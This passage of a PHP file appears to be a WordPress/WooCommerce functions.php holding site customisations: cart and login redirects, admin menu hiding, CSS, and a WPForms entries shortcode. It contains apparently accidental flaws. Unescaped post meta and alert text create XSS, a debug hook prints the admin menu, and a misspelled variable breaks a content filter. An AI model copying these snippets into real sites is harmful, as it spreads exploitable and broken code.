<?php

/**
 * WooCommerce Skip Cart Code
 */
//WooCommerce Skip Cart Code
add_filter( 'woocommerce_add_to_cart_redirect', 'skip_woo_cart' );
 
function skip_woo_cart() {
   return wc_get_checkout_url();
}

/**
 * Change WooCommerce Add To Cart Button Text
 */
// Change WooCommerce Add To Cart Button Text
add_filter('woocommerce_product_single_add_to_cart_text', 'hswp_cart_text'); // single product page
add_filter('woocommerce_product_add_to_cart_text', 'hswp_cart_text'); // product archives(Collection) page
function hswp_cart_text(){
    return __('Subscribe', 'woocommerce');
}

/**
 * Redirect User
 */
/** ---------------------------------------------- *
    * Redirect to: User LoggedIn,
 * ---------------------------------------------- **/

add_action('wp', 'hswp_redirect');
function hswp_redirect()
{
	if ( is_user_logged_in() && is_page('login') ) {  // page_id = 508
        wp_redirect(get_site_url().'/my-account.aspx/');
        exit;
    }

	if ( !is_user_logged_in() && is_page("my-account") && isset($_GET['action']) && $_GET['action']!='lost-password' ) { // page_id = 508  
        wp_redirect(get_site_url().'/login.aspx/');
        exit;
    }
	
    if ( is_user_logged_in() && is_page('service') ) {   // page_id = 505
        wp_redirect(get_site_url().'/my-account.aspx/');
        exit;
    }
	if ( !is_user_logged_in() && is_page('service') ) {
        wp_redirect(get_site_url().'/login.aspx/');
        exit;
    }
	
}

add_action('wp_logout','auto_redirect_after_logout');
function auto_redirect_after_logout(){
wp_redirect( get_site_url().'/login.aspx/' );
exit();
}

// wp-admin / wp-login.php to custom login
add_action( 'login_form_login', 'redirect_login' );
function redirect_login() {
    wp_redirect( home_url( '/login.aspx' ) ); 
}
// Block Access to wp-admin for non admins and redirect to custom page
add_action( 'init', 'hswp_block_access' );
function hswp_block_access() {
  if ( is_user_logged_in() && is_admin() && !current_user_can( 'administrator' ) ) {  // if not work add && (defined('DOING_AJAX') && !DOING_AJAX)
   // wp_redirect( home_url('/my-account') );
   // exit;
  }
}

/**
 * Removing The Coupon Code Section
 */
//https://www.webroomtech.com/category/woocommerce/

//Removing the coupon code section from the Checkout page
remove_action( 'woocommerce_before_checkout_form', 'woocommerce_checkout_coupon_form', 10 );

//Or you can use a more suffisticated way to hide the coupon form on the checkout page:
// hide coupon field on checkout page
function hs_hide_coupon_field_on_woocommerce_checkout( $enabled ) {

	if ( is_checkout() ) {
		$enabled = false;
	}

	return $enabled;
}
add_filter( 'woocommerce_coupons_enabled', 'hs_hide_coupon_field_on_woocommerce_checkout' );

// hide coupon field on cart page
function webroom_hide_coupon_field_on_woocommerce_cart( $enabled ) {

	if ( is_cart() ) {
		$enabled = false;
	}

	return $enabled;
}
add_filter( 'woocommerce_coupons_enabled', 'webroom_hide_coupon_field_on_woocommerce_cart' );

/**
 * Remove View Cart
 */
add_filter( 'wc_add_to_cart_message_html', '__return_null' );

//Or
	//add_filter( 'wc_add_to_cart_message_html', '__return_false');

//Or the normal way:
	//add_filter( 'wc_add_to_cart_message_html', 'empty_wc_add_to_cart_message');
	//function empty_wc_add_to_cart_message( $message, $products ) { 
	//    return ''; 
	//};

/**
 * Custom Menu
 */
add_action( 'admin_init', 'wpse_136058_debug_admin_menu' );
function wpse_136058_debug_admin_menu() {
   // echo '<pre>' . print_r( $GLOBALS[ 'menu' ], TRUE) . '</pre>';
}
if( get_current_user_id() != 1){
	
add_action( 'admin_init', 'hswp_remove_menus' );
function hswp_remove_menus(){
    remove_menu_page( 'index.php' );                  //Dashboard
    remove_menu_page( 'jetpack' );                    //Jetpack* 
    //remove_menu_page( 'edit.php' );                   //Posts
    //remove_menu_page( 'upload.php' );                 //Media
    //remove_menu_page( 'edit.php?post_type=page' );    //Pages
    //remove_menu_page( 'edit-comments.php' );          //Comments
    remove_menu_page( 'themes.php' );                 //Appearance
    remove_menu_page( 'plugins.php' );                //Plugins
    //remove_menu_page( 'users.php' );                  //Users
    remove_menu_page( 'tools.php' );                  //Tools
    //remove_menu_page( 'options-general.php' );        //Settings 
	
	remove_submenu_page('woocommerce', 'checkout_form_designer');
	remove_menu_page( 'envato-market' );        //envato-market
	remove_menu_page( 'edit.php?post_type=acf-field-group' ); //Advanced Custom Fields
	remove_menu_page( 'snippets' );        //Snippets 
	remove_menu_page( 'loco' );        //Loco
	
	remove_menu_page( 'everest-admin-theme-lite' );
	remove_menu_page( 'wpforms-overview' );
	
	
	//remove_menu_page( 'wc-admin&path=/marketing' ); // Woo Marketing
  }

add_action( 'admin_init', function(){    
		remove_menu_page( 'bridge_core_dashboard' );
		remove_menu_page( 'edit.php?post_type=slides' );
		remove_menu_page( 'edit.php?post_type=carousels' );
		remove_menu_page( 'edit.php?post_type=portfolio_page' );
		//remove_menu_page( 'qode_theme_menu' );
		remove_menu_page( 'vc-general' );	
} );

add_filter( 'woocommerce_admin_features', function( $features ) {
    /**
     * Filter list of features and remove those not needed     *
     */
    return array_values(
        array_filter( $features, function($feature) {
            return $feature !== 'marketing';
        } ) 
    );
} );
	
// Disable Theme Editor & File Modifications 
function disable_mytheme_action() {
    define('DISALLOW_FILE_EDIT', true ); //Disable File Editor
    define('DISALLOW_FILE_MODS',true); //Disable File Modifications 
	define('DISABLE_WP_CRON', true);
	define( 'WP_DEBUG', true );
  }
	
add_action('init','disable_mytheme_action');
	
	
	// hide the help tab
add_filter('contextual_help_list','contextual_help_list_remove');
function contextual_help_list_remove(){
    global $current_screen;
    $current_screen->remove_help_tabs();
}
}

// Rename "WooCommerce" menu to "Store Settings".
add_action( 'admin_menu', 'rename_woocoomerce_wpse_100758', 999 );
function rename_woocoomerce_wpse_100758() 
{
    global $menu;
    // Pinpoint menu item
    $woo = recursive_array_search_php_91365( 'WooCommerce', $menu );
    // Validate
    if( !$woo ) return;

    $menu[$woo][0] = 'Store Settings';
}

// http://www.php.net/manual/en/function.array-search.php#91365
function recursive_array_search_php_91365( $needle, $haystack ) 
{
    foreach( $haystack as $key => $value ) 
    {
        $current_key = $key;
        if( 
            $needle === $value 
            OR ( 
                is_array( $value )
                && recursive_array_search_php_91365( $needle, $value ) !== false 
            )
        ) 
        {
            return $current_key;
        }
    }
    return false;
}

// https://smartmedia-kw.com/kfeoch/wp-content/plugins/bridge-core/modules/core-dashboard/assets/img/admin-logo-icon.png
add_action( 'admin_enqueue_scripts', function(){
    $css = <<<EOT
#adminmenu #toplevel_page_woocommerce .menu-icon-generic div.wp-menu-image::before {
    content: ' ';
    background: url('https://theme.zdassets.com/theme_assets/9312424/ee882d4d41ddd9481e1a562798a3c9c35f2c272a.png') no-repeat center;
    background-size: contain;
}
EOT;

wp_add_inline_style( 'woocommerce_admin_menu_styles', $css );}, 11 );

/**
 * Replace Posts label as Articles in Admin Panel
 */
// Replace Posts label as Articles in Admin Panel 
function change_post_menu_label() {
    global $menu;
    global $submenu;
    $menu[5][0] = 'Articles';
    $submenu['edit.php'][5][0] = 'Articles';
    $submenu['edit.php'][10][0] = 'Add Articles';
    echo '';
}
function change_post_object_label() {
        global $wp_post_types;
        $labels = &$wp_post_types['post']->labels;
        $labels->name = 'Articles';
        $labels->singular_name = 'Article';
        $labels->add_new = 'Add Article';
        $labels->add_new_item = 'Add Article';
        $labels->edit_item = 'Edit Article';
        $labels->new_item = 'Article';
        $labels->view_item = 'View Article';
        $labels->search_items = 'Search Articles';
        $labels->not_found = 'No Articles found';
        $labels->not_found_in_trash = 'No Articles found in Trash';
}
add_action( 'init', 'change_post_object_label' );
add_action( 'admin_menu', 'change_post_menu_label' );

/**
 * Debug Admin Menu
 */
add_action( 'admin_init', function() {
    echo '<pre>' . print_r( $GLOBALS[ 'menu' ], TRUE) . '</pre>';
});

/**
 * Admin Color and Styles 
 */
/* Hide Wordpress Version Number
-------------------------------------------- >>> */
// Remove WordPress Meta Generator
remove_action('wp_head', 'wp_generator');

// Hide WordPress Version Info
function hide_wordpress_version() {
	return '';
}
add_filter('the_generator', 'hide_wordpress_version');

// Remove WordPress Version Number In URL Parameters From JS/CSS
function hide_wordpress_version_in_script($src, $handle) {
    $src = remove_query_arg('ver', $src);
	return $src;
}
if (!is_admin()) {
add_filter( 'style_loader_src', 'hide_wordpress_version_in_script', 10, 2 );
add_filter( 'script_loader_src', 'hide_wordpress_version_in_script', 10, 2 );
}
/* Hide Wordpress Version Number
-------------------------------------------- <<< */




/* Start WordPress Custom Font --------------------- >>> */
// WordPress Custom Font @ Admin
// .ab-icon,.fa,.fw-icon-inner, .wp-core-ui, .media-menu, .media-frame *, .media-modal *
function admin_custom_font() {
    echo '<link href="https://fonts.googleapis.com/css?family=Changa:400,700" rel="stylesheet">' . PHP_EOL;
    echo '<style>body, #wpadminbar *:not(.ab-icon,.fa,.fw-icon-inner){font-family:"Changa",sans-serif !important;}</style>' . PHP_EOL;
}
add_action( 'admin_head', 'admin_custom_font' );

// WordPress Custom Font @ Admin Frontend Toolbar
function admin_custom_font_frontend_toolbar() {
    if(current_user_can('administrator')) {
        echo '<link href="https://fonts.googleapis.com/css?family=Changa:400,700" rel="stylesheet">' . PHP_EOL;
        echo '<style>#wpadminbar *:not(.ab-icon){font-family:"Changa",sans-serif !important;}</style>' . PHP_EOL;
    }
}
add_action( 'wp_head', 'admin_custom_font_frontend_toolbar' );

// WordPress Custom Font @ Admin Login
function admin_custom_font_login_page() {
    if(stripos($_SERVER["SCRIPT_NAME"], strrchr(wp_login_url(), '/')) !== false) {
        echo '<link href="https://fonts.googleapis.com/css?family=Changa:400,700&" rel="stylesheet">' . PHP_EOL;
        echo '<style>body{font-family:"Changa",sans-serif !important;}</style>' . PHP_EOL;
    }
}
add_action( 'login_head', 'admin_custom_font_login_page' );
/* End WordPress Custom Font -------------------- <<< */

//remove_action( 'admin_color_scheme_picker', 'admin_color_scheme_picker' );
// add custom user meta data
add_action('personal_options_update', 'save_custom_admin_color_optios');
function save_custom_admin_color_optios( $user_id ) {

    update_user_meta($user_id, 'custom_admin_color_scheme', true);
}
// change default color scheme if not customized
$customized_color_scheme = get_user_option( 'custom_admin_color_scheme', get_current_user_id() );
if ( empty($customized_color_scheme) ) {
	
    update_user_meta(get_current_user_id(), 'admin_color', 'modern');
}

/**
 * Disable REST API for anonymous users
 */
add_filter( 'rest_authentication_errors', function($result) {
  if ( ! empty( $result ) ) {
    return $result;
  }

  $current_route = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/';

  //Please note that allowing /wp-json/route/ is equal to whitelisting /wp-json/route/.*
  $whitelisted_routes = array_merge(['/wp-json/saml', '/wp-json/oembed'], apply_filters('rest_allowed_anonymous_routes', []));

  //search through whitelisted routes
  $route_allowed = false;
  foreach($whitelisted_routes as $whitelisted_route) {
    if(substr($current_route, 0, strlen($whitelisted_route)) === $whitelisted_route) {
      $route_allowed = true;
      break;
    }
  }

  //Handle whitelisting of routes for anonymous users (works for logged in as well)
  if($route_allowed) {
    return $result;
  }
  //Not whitelisted route, check if user is logged in and bail if not
  else if( !is_user_logged_in() ) {
    return new WP_Error( 'rest_cannot_access', __( 'Only authenticated users can access this endpoint.', 'disable-json-api' ), array( 'status' => rest_authorization_required_code() ) );
  }
  //User is logged in, approve all
  else {
    return $result;
  }
});

/**
 * Disable Theme Editor & File Modifications
 */
$current_user = wp_get_current_user();

// Disable Theme Editor & File Modifications // Config.php
function disable_editor() {
	if (!(wp_get_current_user()->user_login == 'hs777it')) {
    define('DISALLOW_FILE_EDIT', true ); //Disable File Editor
    define('DISALLOW_FILE_MODS',true); //Disable File Modifications 
	define('DISABLE_WP_CRON', true);
	define( 'WP_DEBUG', false );
	}
  }
add_action('init','disable_editor');


function hide_update_notice()
{
     // $current_user = wp_get_current_user();
    if (!(wp_get_current_user()->user_login == 'hs777it')) {
        remove_action('admin_notices', 'update_nag', 3);
    }
}
add_action('admin_head', 'hide_update_notice', 1);

function remove_menus()
{
    // $current_user = wp_get_current_user();
    if (wp_get_current_user()->user_login != 'hs777it') {
		//  remove_menu_page( 'index.php' );                  //Dashboard
        //  remove_menu_page( 'edit.php' );                   //Posts
        //  remove_menu_page( 'upload.php' );                 //Media
        //  remove_menu_page( 'edit.php?post_type=page' );    //Pages
        remove_menu_page('edit-comments.php'); //Comments
        //  remove_menu_page( 'themes.php' );                 //Appearance
        remove_menu_page('plugins.php'); //Plugins
        //  remove_menu_page( 'users.php' );                  //Users
        remove_menu_page('tools.php'); //Tools
        //  remove_menu_page( 'options-general.php' );        //Settings
        remove_submenu_page('themes.php', 'themes.php');
        remove_submenu_page('themes.php', 'theme-editor.php');
        remove_submenu_page('themes.php', 'magee-theme-options');
        remove_submenu_page('index.php', 'update-core.php');
        remove_submenu_page('admin.php', 'newsletter_main_index');
    }
}
add_action('admin_menu', 'remove_menus', 110);

/**
 * Admin Bar
 */
// Disable the toolbar 
add_filter( 'show_admin_bar', function( $show ) {
	if ( get_current_user_id() != '7' ) {
		return false;
	}
	return $show;
} );

// Disable Admin Bar
//add_filter('show_admin_bar', '__return_false');

// Remove the WordPress logo from the toolbar
add_action( 'admin_bar_menu', 'remove_wp_logo', 999 );
function remove_wp_logo( $wp_admin_bar ) {
    $wp_admin_bar->remove_node( 'wp-logo' );
}
// Remove view links from the toolbar
function remove_admin_bar_links() {
    global $wp_admin_bar;
    $wp_admin_bar->remove_menu('view-site');  // Remove the view site link
    $wp_admin_bar->remove_menu('view-store'); // Remove the view store link
	$wp_admin_bar->remove_menu('wpforms-menu'); // Remove the view store link
    //$wp_admin_bar->remove_menu('site-name');  // Remove the site name menu
}    
add_action( 'wp_before_admin_bar_render', 'remove_admin_bar_links' );

// Remove items from the admin bar
function remove_from_admin_bar($wp_admin_bar) {
   // if (  ! is_admin() ) {
        // Example of removing item generated by plugin. Full ID is #wp-admin-bar-si_menu
    	$wp_admin_bar->remove_node('si_menu');

        // WordPress Core Items (uncomment to remove)
        $wp_admin_bar->remove_node('updates');
        $wp_admin_bar->remove_node('comments');
        $wp_admin_bar->remove_node('new-content');
		$wp_admin_bar->remove_node('wpforms-menu');
	
        //$wp_admin_bar->remove_node('wp-logo');
        //$wp_admin_bar->remove_node('site-name');
        //$wp_admin_bar->remove_node('my-account');
        //$wp_admin_bar->remove_node('search');
        //$wp_admin_bar->remove_node('customize');
   // }

    $wp_admin_bar->remove_node('wp-logo');
}
add_action('admin_bar_menu', 'remove_from_admin_bar', 999);


// Visit Site In New Tab
add_action( 'admin_bar_menu', 'hswp2777_view_site', 999 );
function hswp2777_view_site( $wp_admin_bar ) {
    $all_toolbar_nodes = $wp_admin_bar->get_nodes();
    foreach ( $all_toolbar_nodes as $node ) {
        if($node->id == 'site-name' || $node->id == 'view-site'){
        $args = $node;
        $args->meta = array('target' => '_blank');
        $wp_admin_bar->add_node( $args );
        }
    }
}

/**
 * CSS
 */
add_action( 'wp_head', function () {
 if ( is_page( 'shop' ) ) { ?>

<style>
.btn {
  background-color: #4CAF50; /* Green */
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  cursor: pointer;
}
.btn.green {background-color: #008CBA;} /* Blue */
.btn.blue {background-color: #008CBA;} /* Blue */
.btn.red {background-color: #f44336;} /* Red */ 
.btn.gray {background-color: #e7e7e7; color: black;} /* Gray */ 
.btn.black {background-color: #555555;} /* Black */

.btn.sm {font-size: 10px;}
.btn.md {font-size: 12px;}
.btn.lg {font-size: 16px;}
.btn.lg2 {font-size: 20px;}
.btn.lg4 {font-size: 24px;}
.btn.lg5 {font-size: 30px;}

.btn.pd {padding: 10px;}
.btn.pd2 {padding: 12px;}
.btn.pd3 {padding: 16px;}
.btn.pd4 {padding: 20px;}
.btn.pd4 {padding: 24px;}
.btn.pd5 {padding: 30px;}

</style>
	
<?php }

if ( is_rtl() ) { ?>
<style>	

nav.main_menu.right {
    margin: 0;
}
.header_top .q_icon_list {
	display: inline-flex !important;
}
.q_icon_list p {
    padding: 0 7px 0 0;
}
.h-separator {
    float: right;
}
div#custom_html-25 {
    float: none; 
}
	
div#wpforms-322 {
    direction: ltr;
}
	
</style>
<?php }	
?>




<style>
	
div#vc_license-activation-notice {
    display: none;
}
	
.header-widget.widget_polylang.header-right-widget {
    background: #c7ecfe;
    border-radius: 4px;
    height: 27px;
    margin-top: 8px;
    margin-left: 2px;
    padding: 1px 4px;
}
.header-widget.widget_polylang.header-right-widget ul {
    list-style-position: inside;
    margin-top: -7px;
}	

.lang-item {
  list-style: none;
}
.header_top{
    height: 45px;    
    line-height: 45px;
}

.header_top .q_icon_list {
    display: inline-block;
    margin-right: 28px;
    margin-bottom: 0
}

.header_top .q_icon_list:last-child{
    margin-right: 0;
}

.header_top .q_icon_list .qode-ili-icon-holder{
    border-radius: 4px;
}

footer .q_icon_list .qode-ili-icon-holder, .q_icon_list i{
    border-radius: 4px
}

.hesperiden.tparrows, .hesperiden.tparrows:before{
    height: 64px;
    width: 64px;
    text-align: center;
    line-height: 67px;
    font-size: 24.5px;
    border-radius: 5px;
    color: #272626;
    font-family: FontAwesome;
    transition: background-color 0.2s ease, color 0.2s ease;
}

.hesperiden.tparrows{
    background-color: #fff;
}

.hesperiden.tparrows:hover{
    background-color: #fab012;
}

.hesperiden.tparrows:hover:before{
color: #fff;
}

.hesperiden.tparrows.tp-leftarrow:before{
    content: '\f053';
}

.hesperiden.tparrows.tp-rightarrow:before{
    content: '\f054';
}
i.qode_icon_font_awesome.fa.fa-arrow-up {
        font-size: 20px! important;
}
.side_menu_button{
    top: 3px;
}
.side_menu .widget {
    margin: 0px 0 28px;
}
.page_not_found{
    padding-top: 75px
}

/* ----------------------------------------------
   * By hs777it@gmail.com / +965 60907666 
 * ---------------------------------------------- */

.drop_down .narrow .second .inner ul li a{
  /*  color: #ffffff !important; */
}

.drop_down .narrow .second .inner ul li:hover {
    background: orange;
}
.drop_down .second .inner {
    /* margin-top: -20px; */
}

.home-holder .q_elements_item_inner {
    max-height: 285px !important;
}
.testimonials_c .testimonial_content .testimonial_title_holder h5 {
    color: #1e659b !important;
    font-size: 27px;
    line-height: 34px;
    font-weight: 700;
    letter-spacing: -0.2px;
}

.line {
  margin:5px 0 12px;
  height:1px;
  background:
    repeating-linear-gradient(to right,#9e9e9e 0,#9e9e9e 5px,transparent 5px,transparent 7px)
}

/* h-separator */
.h-separator {
    margin-bottom: 7px;
    margin-top: 7px;
}
.line1, .line2 {
    background-color: #1e659b !important;
}
.line1 {
    float: left;
    height: 5px;
    width: 50px;
}
.line2 {
    float: left;
    height: 1px;
    margin-top: 2px;
    width: 130px;
}

/*  Testimonial */
.testimonial_content_inner {
    min-height: 430px !important;
}

/*  Clients */
.qode_client_main_image{
-webkit-box-shadow: 3px 3px 5px 0px rgba(0,0,0,0.75);
-moz-box-shadow: 3px 3px 5px 0px rgba(0,0,0,0.75);
box-shadow: 3px 3px 5px 0px rgba(0,0,0,0.75);
}

/* Latest Home Posts */
h5.latest_post_title::after {
    content: "";
    position: absolute;
    left: 0;
    bottom: -7px;
    height: 1px;
    width: 30%;
    border-bottom: 7px solid #1e659b;
}
.blog_holder.blog_small_image article .post_image {
    width: 30% !important;
    float: left;
    margin: 0;
}
 .blog_holder.blog_small_image article .post_text {
    width: 50% !important;
    float: left;
    margin: 0;
}

/*  Login Form 

div.wpforms-container-full, .kflogin {
    margin-bottom: 24px;
    background: #3582bd ; //#1e659b;
    padding: 18px;
    border: 5px solid #fff; //#c7ecfe;
    border-radius: 10px;
    color: #ffffff;
}
*/

/* Login Button*/
/* .btn-login{ border-radius: 20px 0 !important;} */


/* WPForms Login Links */

div.wpforms-container-full .wpforms-form input[type=submit],
div.wpforms-container-full .wpforms-form button[type=submit],
div.wpforms-container-full .wpforms-form .wpforms-page-button
 {
    background-color: #1e659b;
    border: 1px solid #ddd;
    color: #fff;
    font-family: 'Mina';
    font-size: 1.5em;
    padding: 7px 30px;
}
div.wpforms-container-full .wpforms-form input[type=submit]:hover,
 div.wpforms-container-full .wpforms-form button[type=submit]:hover,
 div.wpforms-container-full .wpforms-form .wpforms-page-button:hover
 {
    background-color: #212121;
    border: 1px solid #ddd;
}
div.wpforms-container-full .wpforms-form input[type=submit]:disabled,
div.wpforms-container-full .wpforms-form button[type=submit]:disabled,
div.wpforms-container-full .wpforms-form .wpforms-page-button:disabled,
button[disabled=disabled], button:disabled
 {
    background-color: #cccccc  !important;
    border: 1px solid #999999  !important;
    color: #666666  !important;
}
.desc-link{
/* background: #1e659b !important; */
/* color: #ffffff; */
margin-bottom:7px  !important;
    padding: 6px 10px;
      font-weight: 700;
    
}

/* Footer */
#back_to_top>span {
    background-color: #1e659b;
    border-color: rgba(90,89,89,1);
    border: 2px solid #ffffff;
}
.qbutton, .qbutton.medium, #submit_comment,
.load_more a, .blog_load_more_button a,
.post-password-form input[type='submit'],
input.wpcf7-form-control.wpcf7-submit,
input.wpcf7-form-control.wpcf7-submit:not([disabled]),
.woocommerce table.cart td.actions input[type="submit"],
.woocommerce input#place_order, .woocommerce-page input[type="submit"],
.woocommerce .button {
    margin: 3px;
}
.woocommerce .button.print:before{
/*content: "\f193"; */
/* font: 400 21px/1 dashicons; */
}

.login #login_error, .login .message, .login .success {
    display: none;
}
#login .message, .login #nav {
    display: none !important;
}

#login .message, .login #nav {
    display: none !important;
}

.login #backtoblog {
    font-size: 13px;
    padding: 0px 24px;
    margin: 20px;
    text-align: center;
}

#backtoblog a {
    margin: 40px 0;
    background: #007cba;
    color: #ffffff !important;
    padding: 5px 10px !important;
    margin-top: 20px !important;
}

.terms-body ul{
     text-align: justify;
}

.terms-body ul li, .reg_con p{
       padding: 5px;
       margin-top:5px;
       font-size: 16px;
       color:#212121;
}

.ui-tabs-tab.ui-corner-top.ui-state-default.ui-tab:hover a {
    color: white;
    font-size: 20px;
}
.qode-advanced-tabs.qode-advanced-horizontal-tab .qode-advanced-tabs-nav li.ui-state-active a {
    font-size: 20px;
}

/* Plugins */
div#ure-sidebar, div#ure_pro_advertisement {
    display: none !important;
}

/* WPForm Table*/
table {
    border-collapse: collapse;
}
 
thead tr {
    height: 60px;
}
 
table, th, td {
    border: 1px solid #000000;
}
 
td {
    white-space: normal;
    max-width: 33%;
    width: 33%;
    word-break: break-all;
    height: 60px;
    padding: 10px;
}
tr:nth-child(even) {
    background: #ccc
}
 
tr:nth-child(odd) {
    background: #fff
}
/* Logo RTL in Arabic */
@media only screen and (min-width: 1000px) {
	.rtl .logo_wrapper {
	 float: right !important;
	}
	.rtl header .container_inner .header_inner_left{
	 right: 100px !important;
	}
	.rtl nav.main_menu.right {
	 float: left !important;
	}
}
/* Menu justify in RTL */
@media only screen and (min-width: 1000px) {
	.rtl .drop_down .second {
	 left: inherit !important;
	}
}
	
</style>


<?php
	
	
});

/**
 * Header
 */
function hswp_hook_header() {
	
  //  if ( in_array( $_GET['action'], array('lostpassword', 'retrievepassword') ) ) {

?>

        <!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"> -->
        <style>
            .login-action-lostpassword .message { border-left: 17px solid #71306f; }
            .login #login_error, .login .message, .login .success { display: none;}
            #login .message, .login #nav { display: none !important;}
            #login .message, .login #nav { display: none !important;}
            .login #backtoblog {font-size: 13px;padding: 0px 24px;margin: 20px;text-align: center;}
            #backtoblog a {margin: 40px 0;background: #007cba;color: #ffffff !important;padding: 5px 10px !important;margin-top: 20px !important;}
        </style>
    
<?php
	
//} 
}
add_action('wp_head', 'hswp_hook_header');
add_action( 'lostpassword_form', 'hswp_hook_header' ) ;

/**
 * _wpforms_entries_table
 */
/**
 * Custom shortcode to display WPForms form entries in table view.
 *
 * Basic usage: [wpforms_entries_table id="FORMID"].
 * 
 * Possible shortcode attributes:
 * id (required)  Form ID of which to show entries.
 * user           User ID, or "current" to default to current logged in user.
 * fields         Comma separated list of form field IDs.
 * number         Number of entries to show, defaults to 30.
 * 
 * @link https://wpforms.com/developers/how-to-display-form-entries/
 *
 * Realtime counts could be delayed due to any caching setup on the site
 *
 * @param array $atts Shortcode attributes.
 * 
 * @return string
 */
function wpf_entries_table( $atts ) {
 
    // Pull ID shortcode attributes.
    $atts = shortcode_atts(
        [
            'id'     => '',
            'user'   => '',
            'fields' => '',
            'number' => '',
        ],
        $atts
    );
 
    // Check for an ID attribute (required) and that WPForms is in fact
    // installed and activated.
    if ( empty( $atts['id'] ) || ! function_exists( 'wpforms' ) ) {
        return;
    }
 
    // Get the form, from the ID provided in the shortcode.
    $form = wpforms()->form->get( absint( $atts['id'] ) );
 
    // If the form doesn't exists, abort.
    if ( empty( $form ) ) {
        return;
    }
 
    // Pull and format the form data out of the form object.
    $form_data = ! empty( $form->post_content ) ? wpforms_decode( $form->post_content ) : '';
 
    // Check to see if we are showing all allowed fields, or only specific ones.
    $form_field_ids = ! empty( $atts['fields'] ) ? explode( ',', str_replace( ' ', '', $atts['fields'] ) ) : [];
 
    // Setup the form fields.
    if ( empty( $form_field_ids ) ) {
        $form_fields = $form_data['fields'];
    } else {
        $form_fields = [];
        foreach ( $form_field_ids as $field_id ) {
            if ( isset( $form_data['fields'][ $field_id ] ) ) {
                $form_fields[ $field_id ] = $form_data['fields'][ $field_id ];
            }
        }
    }
 
    if ( empty( $form_fields ) ) {
        return;
    }
 
    // Here we define what the types of form fields we do NOT want to include,
    // instead they should be ignored entirely.
    $form_fields_disallow = apply_filters( 'wpforms_frontend_entries_table_disallow', [ 'divider', 'html', 'pagebreak', 'captcha' ] );
 
    // Loop through all form fields and remove any field types not allowed.
    foreach ( $form_fields as $field_id => $form_field ) {
        if ( in_array( $form_field['type'], $form_fields_disallow, true ) ) {
            unset( $form_fields[ $field_id ] );
        }
    }
 
    $entries_args = [
        'form_id' => absint( $atts['id'] ),
    ];
 
    // Narrow entries by user if user_id shortcode attribute was used.
    if ( ! empty( $atts['user'] ) ) {
        if ( $atts['user'] === 'current' && is_user_logged_in() ) {
            $entries_args['user_id'] = get_current_user_id();
        } else {
            $entries_args['user_id'] = absint( $atts['user'] );
        }
    }
 
    // Number of entries to show. If empty, defaults to 30.
    if ( ! empty( $atts['number'] ) ) {
        $entries_args['number'] = absint( $atts['number'] );
    }
 
    // Get all entries for the form, according to arguments defined.
    // There are many options available to query entries. To see more, check out
    // the get_entries() function inside class-entry.php (https://a.cl.ly/bLuGnkGx).
    $entries = wpforms()->entry->get_entries( $entries_args );
 
    if ( empty( $entries ) ) {
        return '<p>No entries found.</p>';
    }
 
    ob_start();
 
    echo '<table class="wpforms-frontend-entries">';
 
        echo '<thead><tr>';
 
            // Loop through the form data so we can output form field names in
            // the table header.
            foreach ( $form_fields as $form_field ) {
 
                // Output the form field name/label.
                echo '<th>';
                    echo esc_html( sanitize_text_field( $form_field['label'] ) );
                echo '</th>';
            }
 
        echo '</tr></thead>';
 
        echo '<tbody>';
 
            // Now, loop through all the form entries.
            foreach ( $entries as $entry ) {
 
                echo '<tr>';
 
                // Entry field values are in JSON, so we need to decode.
                $entry_fields = json_decode( $entry->fields, true );
 
                foreach ( $form_fields as $form_field ) {
 
                    echo '<td>';
 
                        foreach ( $entry_fields as $entry_field ) {
                            if ( absint( $entry_field['id'] ) === absint( $form_field['id'] ) ) {
                                echo apply_filters( 'wpforms_html_field_value', wp_strip_all_tags( $entry_field['value'] ), $entry_field, $form_data, 'entry-frontend-table' );
                                break;
                            }
                        }
 
                    echo '</td>';
                }
 
                echo '</tr>';
            }
 
        echo '</tbody>';
 
    echo '</table>';
 
    $output = ob_get_clean();
 
    return $output;
}
add_shortcode( 'wpforms_entries_table', 'wpf_entries_table' );

/**
 * get_userdata
 */
function function_alert($message) { 
    echo "<script>alert('$message');</script>"; 
} 
 
add_action('wp', 'hswp');
function hswp()
{
	if ( is_user_logged_in() && is_page('about-us') ) {
		
		$user_id = get_current_user_id(); 
		$user_info = get_userdata($user_id)->registration_type;
		
		if ($user_info === 'Local Office') {
			//function_alert($user_info);
			wp_redirect(get_site_url().'/my-account/');
		}	
    }
	
}

/**
 * Admin color scheme
 */
add_filter( 'get_user_option_admin_color', function( $color_scheme ) {
	$color_scheme = 'Modern'; return $color_scheme; }, 1 );
remove_action("admin_color_scheme_picker", "admin_color_scheme_picker");

/**
 * Register Meta box
 */
//Register Meta box
add_action('add_meta_boxes',function (){
 
    add_meta_box('csm-id','Social link','cm_field_cb','post','side');
});
//Meta callback function
function cm_field_cb($post){
    $cs_meta_val=get_post_meta($post->ID);
    ?>
    <input type="url" name="cs-meta-name"
     value="<?php if( isset ( $cs_meta_val['cs-meta-name'])) echo $cs_meta_val['cs-meta-name'][0] ?>" >
    <?php
     
}
//save meta value with save post hook
add_action('save_post',function($post_id){
 
    if(isset($_POST['cs-meta-name'])){
 
        update_post_meta($post_id,'cs-meta-name',$_POST['cs-meta-name']);
    }
 
});
 
// show meta value after post content
add_filter('the_content',function($content){
    $meta_val=get_post_meta(get_the_ID(),'cs-meta-name',true);
    return $cotent.$meta_val;
 
});

/**
 * Add multiple Products to Cart
 */
// Add multiple Products to Cart
function wc_add_multiple_products_to_cart() {
// Make sure WC is installed, and add-to-cart qauery arg exists, and contains at least one comma.
if ( ! class_exists( 'WC_Form_Handler' ) || empty( $_REQUEST['add-to-cart'] ) || false === strpos( $_REQUEST['add-to-cart'], ',' ) ) {
	return;
}

// Remove WooCommerce's hook, as it's useless (doesn't handle multiple products).
// https://stackoverflow.com/questions/42570982/adding-multiple-items-to-woocommerce-cart-at-once
remove_action( 'wp_loaded', array( 'WC_Form_Handler', 'add_to_cart_action' ), 20 );
	$product_ids = explode( ',', $_REQUEST['add-to-cart'] );
	$count       = count( $product_ids );
	$number      = 0;

foreach ( $product_ids as $product_id ) {
	if ( ++$number === $count ) {
		// Ok, final item, let's send it back to woocommerce's add_to_cart_action method for handling.
		$_REQUEST['add-to-cart'] = $product_id;
		return WC_Form_Handler::add_to_cart_action();
	}
